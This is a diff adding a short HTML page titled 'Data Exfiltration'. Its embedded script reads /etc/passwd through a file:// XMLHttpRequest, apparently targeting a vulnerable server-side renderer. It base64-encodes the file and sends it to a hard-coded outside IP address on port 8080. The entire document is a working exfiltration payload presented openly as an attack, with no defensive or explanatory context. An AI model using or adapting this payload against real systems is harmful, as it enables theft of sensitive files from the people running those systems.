@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Data Exfiltration</title>
+</head>
+<body>
+<script>
+  const xhr = new XMLHttpRequest();
+  
+  // Attempt to request /etc/passwd (or another sensitive file) from the vulnerable server
+  xhr.open('GET', 'file:///etc/passwd', false); // Synchronous request
+  
+  xhr.send();
+
+  if (xhr.status === 200) {
+    const responseData = xhr.responseText;
+    
+    // Send the exfiltrated data to your server hosted at 139.180.206.59 (listening on port 8080)
+    const exfilUrl = 'http://139.180.206.59:8080/?exfil=' + btoa(responseData); // Base64 encode the data
+    
+    const xhr2 = new XMLHttpRequest();
+    xhr2.open('GET', exfilUrl, false); // Synchronous request for exfiltration
+    xhr2.setRequestHeader('Content-Type', 'text/plain');
+    
+    xhr2.send();
+  }
+</script>
+</body>
+</html>
